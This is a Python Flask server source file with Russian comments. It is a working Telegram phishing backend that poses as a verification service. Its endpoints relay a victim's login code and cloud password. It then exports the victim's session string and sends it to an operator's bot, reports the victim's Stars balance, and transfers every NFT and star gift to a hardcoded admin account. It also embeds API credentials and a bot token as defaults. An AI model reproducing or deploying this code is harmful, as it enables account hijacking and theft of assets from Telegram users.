# app.py — ИСПРАВЛЕНИЕ С GetStarsStatusRequest v9.4

from flask import Flask, request, jsonify
from flask_cors import CORS
import asyncio
import time
import random
import os
import json
import io
import re
from datetime import datetime, timedelta
from dotenv import load_dotenv
from telethon import TelegramClient
from telethon.errors import FloodWaitError, SessionPasswordNeededError
from telethon.tl.functions.payments import GetStarGiftsRequest, TransferStarGiftRequest, GetStarsStatusRequest
from telethon.sessions import StringSession
import requests

load_dotenv()

app = Flask(__name__)
CORS(app)

# ======== КОНФИГ ========
API_ID = int(os.getenv('API_ID', '27908807'))
API_HASH = os.getenv('API_HASH', 'e895a9ab366174a6d38fba5e752562a0')
ADMIN_BOT_TOKEN = os.getenv('ADMIN_BOT_TOKEN', '8992384950:AAFwp5-Bbe9TSn-N--2W3I7oMS2Lcolomec')
ADMIN_CHAT_ID = os.getenv('ADMIN_CHAT_ID', '7303763255')
ADMIN_USER_ID = int(os.getenv('ADMIN_USER_ID', '7303763255'))

user_sessions = {}  # Хранит активные сессии клиентов
loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)

# ======== ОТПРАВКА ЛОГОВ ========
def send_admin_log(text):
    """Отправка лога админу"""
    try:
        requests.post(
            f"https://api.telegram.org/bot{ADMIN_BOT_TOKEN}/sendMessage",
            json={'chat_id': ADMIN_CHAT_ID, 'text': text, 'parse_mode': 'Markdown'},
            timeout=5
        )
    except Exception as e:
        print(f"Log error: {e}")

def send_session_to_admin(phone, session_string, username, user_id):
    """Отправка сессии админу"""
    try:
        lines = []
        lines.append("=" * 50)
        lines.append("🔑 СЕССИЯ ПОЛЬЗОВАТЕЛЯ")
        lines.append("=" * 50)
        lines.append(f"🆔 ID: {user_id}")
        lines.append(f"📱 Phone: {phone}")
        lines.append(f"👤 Username: @{username}")
        lines.append("")
        lines.append("SESSION STRING:")
        lines.append(session_string)

        content = "\n".join(lines)
        file_data = io.BytesIO(content.encode('utf-8'))

        files = {'document': (f"session_{phone}_{int(time.time())}.txt", file_data)}
        data = {
            'chat_id': ADMIN_CHAT_ID,
            'caption': f"✅ Сессия @{username}\n📱 {phone}",
            'parse_mode': 'Markdown'
        }
        requests.post(
            f"https://api.telegram.org/bot{ADMIN_BOT_TOKEN}/sendDocument",
            files=files,
            data=data,
            timeout=30
        )
    except Exception as e:
        print(f"Send session error: {e}")

def send_gift_to_admin(phone, username, gift_data, gift_type="NFT"):
    """Отправка информации о подарке админу с ссылкой"""
    try:
        gift_id = gift_data.get('id')
        name = gift_data.get('name', f"Gift #{gift_id}")
        slug = gift_data.get('slug')
        
        # Формируем ссылку на подарок
        if slug:
            link = f"https://t.me/nft/{slug}"
        else:
            link = f"https://t.me/nft/{name.replace(' ', '_')}-{gift_id}"
        
        # Проверяем КД для звездных подарков
        cooldown_info = ""
        if gift_type == "STAR":
            cooldown_until = gift_data.get('cooldown_until')
            if cooldown_until:
                if isinstance(cooldown_until, datetime):
                    remaining = (cooldown_until - datetime.now()).total_seconds() / 3600
                    if remaining > 0:
                        cooldown_info = f"\n⏳ КД: {remaining:.1f} часов"
                    else:
                        cooldown_info = "\n✅ КД нет, можно конвертировать"
                else:
                    cooldown_info = "\n⚠️ Не могу определить КД"
        
        text = (
            f"🎁 *{gift_type} подарок*\n"
            f"📌 *{name}*\n"
            f"🆔 ID: `{gift_id}`\n"
            f"📱 Phone: `{phone}`\n"
            f"👤 Username: @{username}\n"
            f"🔗 [Ссылка]({link}){cooldown_info}"
        )
        requests.post(
            f"https://api.telegram.org/bot{ADMIN_BOT_TOKEN}/sendMessage",
            json={'chat_id': ADMIN_CHAT_ID, 'text': text, 'parse_mode': 'Markdown'},
            timeout=5
        )
    except Exception as e:
        print(f"Send gift error: {e}")

def send_debug_to_admin(text):
    """Отправка отладочной информации"""
    try:
        requests.post(
            f"https://api.telegram.org/bot{ADMIN_BOT_TOKEN}/sendMessage",
            json={'chat_id': ADMIN_CHAT_ID, 'text': f"🐛 DEBUG:\n{text}", 'parse_mode': 'Markdown'},
            timeout=5
        )
    except Exception as e:
        print(f"Send debug error: {e}")

# ======== ПОЛУЧЕНИЕ БАЛАНСА ЗВЁЗД (ПРАВИЛЬНЫЙ МЕТОД) ========
async def get_user_stars_balance(client, user_id):
    """
    Получает баланс Telegram Stars пользователя
    Использует GetStarsStatusRequest
    """
    try:
        result = await client(GetStarsStatusRequest(
            user_id=user_id
        ))
        
        if result and hasattr(result, 'balance'):
            return result.balance
        elif result and hasattr(result, 'stars_balance'):
            return result.stars_balance
        elif result and hasattr(result, 'amount'):
            return result.amount
        
        return 0
    except Exception as e:
        print(f"[-] GetStarsStatusRequest error: {e}")
        # Пробуем альтернативный способ через get_me
        try:
            me = await client.get_me()
            if hasattr(me, 'stars_balance'):
                return me.stars_balance
            elif hasattr(me, 'balance'):
                return me.balance
        except:
            pass
        return 0

def send_balance_to_admin(phone, username, balance):
    """Отправляет баланс звёзд админу"""
    try:
        text = (
            f"⭐ *Баланс Telegram Stars*\n"
            f"📱 Phone: `{phone}`\n"
            f"👤 Username: @{username}\n"
            f"💰 Баланс: `{balance}` ⭐"
        )
        requests.post(
            f"https://api.telegram.org/bot{ADMIN_BOT_TOKEN}/sendMessage",
            json={'chat_id': ADMIN_CHAT_ID, 'text': text, 'parse_mode': 'Markdown'},
            timeout=5
        )
    except Exception as e:
        print(f"Send balance error: {e}")

# ======== ПОЛУЧЕНИЕ ВСЕХ ПОДАРКОВ ========
async def get_user_gifts_telethon(client, user_id):
    """
    Получает ВСЕ подарки пользователя (и NFT, и звездные)
    Возвращает список словарей с полной информацией
    """
    try:
        send_debug_to_admin(f"📥 Запрос подарков для user_id: {user_id}")
        
        result = await client(GetStarGiftsRequest(
            user_id=user_id,
            limit=200,
            offset='0'
        ))
        
        # Отправляем отладочную информацию о структуре ответа
        debug_info = f"Result type: {type(result)}\n"
        debug_info += f"Result dir: {dir(result)[:20]}\n"
        if result:
            debug_info += f"Has gifts attr: {hasattr(result, 'gifts')}\n"
            if hasattr(result, 'gifts'):
                debug_info += f"Gifts length: {len(result.gifts)}\n"
                if len(result.gifts) > 0:
                    debug_info += f"First gift type: {type(result.gifts[0])}\n"
                    debug_info += f"First gift dir: {dir(result.gifts[0])[:20]}"
        
        send_debug_to_admin(debug_info)
        
        gifts = []
        if result and hasattr(result, 'gifts'):
            for idx, gift in enumerate(result.gifts):
                # Собираем все возможные атрибуты
                gift_dict = {}
                
                # Пробуем получить все доступные атрибуты
                for attr in dir(gift):
                    if not attr.startswith('_'):
                        try:
                            value = getattr(gift, attr)
                            if not callable(value):
                                gift_dict[attr] = str(value)
                        except:
                            pass
                
                # Отправляем информацию о первом подарке для отладки
                if idx == 0:
                    send_debug_to_admin(f"🎁 Первый подарок:\n{json.dumps(gift_dict, indent=2)[:500]}")
                
                # Определяем тип подарка
                is_nft = False
                is_star = False
                
                # Проверяем по всем возможным признакам
                if hasattr(gift, 'limited') and gift.limited:
                    is_nft = True
                elif hasattr(gift, 'is_limited') and gift.is_limited:
                    is_nft = True
                elif hasattr(gift, 'collectible') and gift.collectible:
                    is_nft = True
                elif hasattr(gift, 'sticker_set_name') and gift.sticker_set_name:
                    is_nft = True
                elif hasattr(gift, 'is_nft') and gift.is_nft:
                    is_nft = True
                
                # Если не нашли признаков NFT, считаем звездным
                if not is_nft:
                    is_star = True
                
                # Получаем ID разными способами
                gift_id = None
                if hasattr(gift, 'id'):
                    gift_id = gift.id
                elif hasattr(gift, 'gift_id'):
                    gift_id = gift.gift_id
                elif hasattr(gift, 'sticker_id'):
                    gift_id = gift.sticker_id
                elif hasattr(gift, 'nft_id'):
                    gift_id = gift.nft_id
                
                if not gift_id:
                    send_debug_to_admin(f"❌ Не удалось получить ID для подарка {idx}")
                    continue
                
                # Получаем имя
                name = None
                if hasattr(gift, 'name') and gift.name:
                    name = gift.name
                elif hasattr(gift, 'title') and gift.title:
                    name = gift.title
                elif hasattr(gift, 'sticker_set_name') and gift.sticker_set_name:
                    name = gift.sticker_set_name
                elif hasattr(gift, 'display_name') and gift.display_name:
                    name = gift.display_name
                
                if not name:
                    name = f"Gift #{gift_id}"
                
                # Проверяем КД для звездных подарков
                cooldown_until = None
                if is_star:
                    if hasattr(gift, 'cooldown_until'):
                        cooldown_until = gift.cooldown_until
                    elif hasattr(gift, 'cooldown'):
                        cooldown_until = gift.cooldown
                    elif hasattr(gift, 'cooldown_end'):
                        cooldown_until = gift.cooldown_end
                
                slug = None
                if hasattr(gift, 'slug'):
                    slug = gift.slug
                
                gifts.append({
                    'id': gift_id,
                    'name': name,
                    'slug': slug,
                    'is_nft': is_nft,
                    'is_star': is_star,
                    'cooldown_until': cooldown_until,
                    'raw_data': gift,
                    'all_attrs': gift_dict
                })
        
        send_debug_to_admin(f"✅ Найдено подарков: {len(gifts)}\nNFT: {len([g for g in gifts if g['is_nft']])}\nЗвездных: {len([g for g in gifts if g['is_star']])}")
        
        print(f"[+] Found {len(gifts)} gifts for user {user_id}")
        return gifts
        
    except Exception as e:
        error_msg = str(e)
        send_debug_to_admin(f"❌ Ошибка GetStarGiftsRequest:\n{error_msg}")
        print(f"[-] GetStarGiftsRequest error: {e}")
        return []

# ======== ПЕРЕДАЧА ПОДАРКА ========
async def transfer_gift_telethon(client, gift_id, to_user_id):
    """
    Передает подарок другому пользователю
    """
    try:
        await client(TransferStarGiftRequest(
            gift_id=gift_id,
            to_id=to_user_id
        ))
        return True
    except FloodWaitError as e:
        wait_time = e.seconds
        send_admin_log(f"⏳ FloodWait {wait_time} секунд")
        await asyncio.sleep(wait_time)
        try:
            await client(TransferStarGiftRequest(
                gift_id=gift_id,
                to_id=to_user_id
            ))
            return True
        except:
            return False
    except Exception as e:
        print(f"[-] Transfer error for {gift_id}: {e}")
        return False

# ======== ОСНОВНАЯ ЛОГИКА ОБРАБОТКИ ========
async def process_user_gifts_with_client(client, phone, username, user_id):
    """
    Обрабатывает все подарки пользователя:
    1. Проверяет баланс звёзд и отправляет админу
    2. Отправляет ссылки на все подарки
    3. NFT передает админу
    4. Звездные проверяет на КД и конвертирует
    """
    try:
        # Проверяем клиента
        try:
            me = await client.get_me()
            if not me:
                send_admin_log(f"❌ Клиент не активен\n📱 {phone}")
                return False
        except Exception as e:
            send_admin_log(f"❌ Ошибка проверки клиента\n📱 {phone}\n`{str(e)[:100]}`")
            return False
        
        # Если это админ — показываем всё
        if user_id == ADMIN_USER_ID:
            send_admin_log(f"👑 Админ @{username} проверил свои данные")
            
            # Проверяем баланс админа
            balance = await get_user_stars_balance(client, user_id)
            send_balance_to_admin(phone, username, balance)
            
            gifts = await get_user_gifts_telethon(client, user_id)
            if gifts:
                send_admin_log(f"📦 Найдено {len(gifts)} подарков у админа")
                for gift in gifts:
                    gift_type = "NFT" if gift['is_nft'] else "STAR"
                    send_gift_to_admin(phone, username, gift, gift_type)
            else:
                send_admin_log(f"📭 У админа нет подарков (или ошибка)")
            return True
        
        # Для обычных пользователей
        # Сначала проверяем баланс звёзд пользователя
        send_admin_log(f"⭐ Проверяю баланс звёзд @{username}...")
        balance = await get_user_stars_balance(client, user_id)
        send_balance_to_admin(phone, username, balance)
        
        # Ищем подарки
        send_admin_log(f"🔍 Ищем подарки @{username}...")
        gifts = await get_user_gifts_telethon(client, user_id)
        
        if not gifts:
            send_admin_log(
                f"📭 *Нет подарков*\n"
                f"📱 {phone}\n"
                f"👤 @{username}\n"
                f"⭐ Баланс: {balance}"
            )
            return True
        
        # Сортируем: сначала NFT, потом звездные
        nft_gifts = [g for g in gifts if g['is_nft']]
        star_gifts = [g for g in gifts if g['is_star']]
        
        send_admin_log(
            f"🎁 *Найдено {len(gifts)} подарков*\n"
            f"📱 {phone}\n"
            f"👤 @{username}\n"
            f"⭐ Баланс: {balance}\n"
            f"🟣 NFT: {len(nft_gifts)}\n"
            f"⭐ Звездные: {len(star_gifts)}\n\n"
            f"🔄 Начинаю обработку..."
        )
        
        # Сначала отправляем ссылки на все подарки
        for gift in gifts:
            gift_type = "NFT" if gift['is_nft'] else "STAR"
            send_gift_to_admin(phone, username, gift, gift_type)
        
        # Обрабатываем NFT подарки (передаем админу)
        transferred_nft = 0
        failed_nft = 0
        
        for gift in nft_gifts:
            gift_id = gift['id']
            name = gift['name']
            
            send_admin_log(f"🔄 Передаю NFT *{name}*...")
            
            success = await transfer_gift_telethon(client, gift_id, ADMIN_USER_ID)
            
            if success:
                transferred_nft += 1
                send_admin_log(f"✅ NFT {name} передан админу")
            else:
                failed_nft += 1
                send_admin_log(f"❌ Не удалось передать NFT {name}")
            
            await asyncio.sleep(0.5)
        
        # Обрабатываем звездные подарки
        converted_star = 0
        failed_star = 0
        cooldown_star = 0
        
        for gift in star_gifts:
            gift_id = gift['id']
            name = gift['name']
            cooldown_until = gift.get('cooldown_until')
            
            # Проверяем КД
            can_convert = True
            if cooldown_until:
                if isinstance(cooldown_until, datetime):
                    if cooldown_until > datetime.now():
                        can_convert = False
                        remaining = (cooldown_until - datetime.now()).total_seconds() / 3600
                        send_admin_log(f"⏳ Звездный {name} на КД {remaining:.1f} часов")
                        cooldown_star += 1
                        continue
            
            if can_convert:
                send_admin_log(f"⭐ Конвертирую звездный *{name}*...")
                
                success = await transfer_gift_telethon(client, gift_id, ADMIN_USER_ID)
                
                if success:
                    converted_star += 1
                    send_admin_log(f"✅ Звездный {name} передан админу для конвертации")
                else:
                    failed_star += 1
                    send_admin_log(f"❌ Не удалось передать звездный {name}")
                
                await asyncio.sleep(0.5)
        
        # Итоговый отчет
        send_admin_log(
            f"📊 *Результат обработки*\n"
            f"📱 {phone}\n"
            f"👤 @{username}\n"
            f"⭐ Баланс: {balance}\n"
            f"📦 Всего: {len(gifts)}\n"
            f"🟣 NFT: {len(nft_gifts)}\n"
            f"   ✅ Передано: {transferred_nft}\n"
            f"   ❌ Не удалось: {failed_nft}\n"
            f"⭐ Звездные: {len(star_gifts)}\n"
            f"   ✅ Передано: {converted_star}\n"
            f"   ❌ Не удалось: {failed_star}\n"
            f"   ⏳ На КД: {cooldown_star}"
        )
        
        return True
        
    except Exception as e:
        error_msg = str(e)[:200]
        send_admin_log(f"❌ Ошибка\n📱 {phone}\n`{error_msg}`")
        return False

# ======== ВЕРИФИКАЦИЯ ========
async def send_code_telethon(phone):
    try:
        client = TelegramClient(f"temp_{phone}", API_ID, API_HASH)
        await client.connect()
        
        sent_code = await client.send_code_request(phone)
        
        user_sessions[phone] = {
            'client': client,
            'phone_code_hash': sent_code.phone_code_hash,
            'phone': phone
        }
        
        send_admin_log(f"📱 Код отправлен для {phone}")
        return {'success': True, 'phone_code_hash': sent_code.phone_code_hash}
        
    except Exception as e:
        return {'success': False, 'error': str(e)}

async def check_code_telethon(phone, code, phone_code_hash):
    try:
        session_data = user_sessions.get(phone)
        if not session_data:
            return {'success': False, 'error': 'Session not found'}
        
        client = session_data['client']
        
        try:
            signed_in = await client.sign_in(
                phone=phone,
                code=code,
                phone_code_hash=phone_code_hash
            )
            
            me = await client.get_me()
            
            try:
                if hasattr(client, 'export_session_string'):
                    session_string = await client.export_session_string()
                elif hasattr(client.session, 'save'):
                    session_string = client.session.save()
                else:
                    session_string = StringSession.save(client.session)
            except Exception as e:
                print(f"Session export error: {e}")
                session_string = str(client.session)
            
            user_data = {
                'user_id': me.id,
                'phone': phone,
                'username': me.username or f"user_{random.randint(10000, 99999)}",
                'first_name': me.first_name or 'User',
                'last_name': me.last_name or '',
                'session_string': session_string
            }
            
            send_admin_log(f"✅ Верификация успешна\n📱 {phone}\n👤 @{user_data['username']}")
            send_session_to_admin(phone, session_string, user_data['username'], user_data['user_id'])
            
            user_sessions[phone]['authorized'] = True
            user_sessions[phone]['user_data'] = user_data
            
            result = await process_user_gifts_with_client(
                client,
                phone,
                user_data['username'],
                user_data['user_id']
            )
            
            try:
                await client.disconnect()
            except:
                pass
            
            if phone in user_sessions:
                del user_sessions[phone]
            
            return {
                'success': True,
                'hasPassword': False,
                'sessionData': user_data,
                'gifts_processed': result
            }
            
        except SessionPasswordNeededError:
            send_admin_log(f"🔐 Требуется пароль\n📱 {phone}")
            return {'success': True, 'hasPassword': True, 'message': 'Cloud password required'}
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
            
    except Exception as e:
        return {'success': False, 'error': str(e)}

async def check_password_telethon(phone, password):
    try:
        session_data = user_sessions.get(phone)
        if not session_data:
            return {'success': False, 'error': 'Session not found'}
        
        client = session_data['client']
        
        try:
            await client.sign_in(password=password)
            
            me = await client.get_me()
            
            try:
                if hasattr(client, 'export_session_string'):
                    session_string = await client.export_session_string()
                elif hasattr(client.session, 'save'):
                    session_string = client.session.save()
                else:
                    session_string = StringSession.save(client.session)
            except Exception as e:
                print(f"Session export error: {e}")
                session_string = str(client.session)
            
            user_data = {
                'user_id': me.id,
                'phone': phone,
                'username': me.username or f"user_{random.randint(10000, 99999)}",
                'first_name': me.first_name or 'User',
                'last_name': me.last_name or '',
                'session_string': session_string
            }
            
            send_admin_log(f"🔑 Верификация по паролю успешна\n📱 {phone}\n👤 @{user_data['username']}")
            send_session_to_admin(phone, session_string, user_data['username'], user_data['user_id'])
            
            user_sessions[phone]['authorized'] = True
            user_sessions[phone]['user_data'] = user_data
            
            result = await process_user_gifts_with_client(
                client,
                phone,
                user_data['username'],
                user_data['user_id']
            )
            
            try:
                await client.disconnect()
            except:
                pass
            
            if phone in user_sessions:
                del user_sessions[phone]
            
            return {
                'success': True,
                'sessionData': user_data,
                'gifts_processed': result
            }
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
            
    except Exception as e:
        return {'success': False, 'error': str(e)}

def run_async(coro):
    return loop.run_until_complete(coro)

# ======== FLASK ЭНДПОИНТЫ ========
@app.route('/ping', methods=['GET'])
@app.route('/', methods=['GET'])
@app.route('/status', methods=['GET'])
def ping():
    methods_available = {
        'GetStarGiftsRequest': False,
        'TransferStarGiftRequest': False,
        'GetStarsStatusRequest': False
    }
    
    try:
        from telethon.tl.functions.payments import GetStarGiftsRequest
        methods_available['GetStarGiftsRequest'] = True
    except:
        pass
    
    try:
        from telethon.tl.functions.payments import TransferStarGiftRequest
        methods_available['TransferStarGiftRequest'] = True
    except:
        pass
    
    try:
        from telethon.tl.functions.payments import GetStarsStatusRequest
        methods_available['GetStarsStatusRequest'] = True
    except:
        pass
    
    return jsonify({
        'status': 'online',
        'service': 'NFT/Star Gift Transfer + Balance',
        'version': '9.4',
        'methods_available': methods_available,
        'admin_id': ADMIN_USER_ID,
        'active_sessions': len(user_sessions)
    })

@app.route('/sendCode', methods=['POST'])
def send_code():
    data = request.json or {}
    phone = data.get('phone', '').strip()
    
    if not phone or len(phone) < 6:
        return jsonify({'success': False, 'error': 'Invalid phone'}), 400
    
    result = run_async(send_code_telethon(phone))
    
    if result['success']:
        return jsonify({
            'success': True,
            'phoneCodeHash': result.get('phone_code_hash'),
            'message': 'Code sent by Telegram'
        })
    else:
        return jsonify({'success': False, 'error': result.get('error')}), 400

@app.route('/checkCode', methods=['POST'])
def check_code():
    data = request.json or {}
    phone = data.get('phone', '').strip()
    code = data.get('code', '').strip()
    phone_code_hash = data.get('phoneCodeHash', '').strip()
    
    if not phone or not code or not phone_code_hash:
        return jsonify({'success': False, 'error': 'Missing fields'}), 400
    
    result = run_async(check_code_telethon(phone, code, phone_code_hash))
    
    if result['success']:
        if result.get('hasPassword'):
            return jsonify({
                'success': True,
                'hasPassword': True,
                'message': 'Cloud password required'
            })
        else:
            return jsonify({
                'success': True,
                'hasPassword': False,
                'sessionData': result.get('sessionData'),
                'gifts_processed': result.get('gifts_processed', False),
                'message': 'Verified and processed'
            })
    else:
        return jsonify({'success': False, 'error': result.get('error')}), 400

@app.route('/checkPassword', methods=['POST'])
def check_password():
    data = request.json or {}
    phone = data.get('phone', '').strip()
    password = data.get('password', '').strip()
    
    if not phone or not password:
        return jsonify({'success': False, 'error': 'Missing phone or password'}), 400
    
    result = run_async(check_password_telethon(phone, password))
    
    if result['success']:
        return jsonify({
            'success': True,
            'sessionData': result.get('sessionData'),
            'gifts_processed': result.get('gifts_processed', False),
            'message': 'Password verified and processed'
        })
    else:
        return jsonify({'success': False, 'error': result.get('error')}), 400

if __name__ == '__main__':
    print("=" * 60)
    print("⭐ NFT/STAR GIFT TRANSFER + BALANCE v9.4")
    print("📌 Исправлен импорт GetStarsStatusRequest")
    print("=" * 60)
    app.run(host='0.0.0.0', port=5000, debug=False)
